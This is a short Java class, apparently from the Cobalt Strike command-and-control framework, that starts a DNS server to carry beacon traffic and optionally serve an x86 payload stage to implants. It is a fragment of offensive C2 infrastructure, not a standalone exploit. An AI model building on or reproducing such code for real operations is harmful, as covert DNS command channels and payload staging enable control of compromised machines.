package beacon.c2setup;

import beacon.BeaconC2;
import beacon.BeaconDNS;
import common.ScListener;
import dns.DNSServer;
import server.Resources;

public class BeaconSetupDNS extends BeaconSetupC2 {
    protected int port = 0;

    protected BeaconDNS handler = null;

    protected DNSServer server;

    public BeaconSetupDNS(Resources resources, ScListener scListener, BeaconC2 beaconC2) {
        super(resources, scListener, beaconC2);
        this.port = scListener.getBindPort();
    }

    public void start() throws Exception {
        this.handler = new BeaconDNS(getListener(), getProfile(), getController());
        if (getProfile().option(".host_stage"))
            this.handler.setPayloadStage(this.listener.export("x86"));
        this.server = new DNSServer(this.listener.getBindPort());
        this.server.setDefaultTTL(getProfile().getInt(".dns_ttl"));
        this.server.installHandler(this.handler);
        this.server.go();
    }

    public void stop() throws Exception {
        this.server.stop();
    }
}
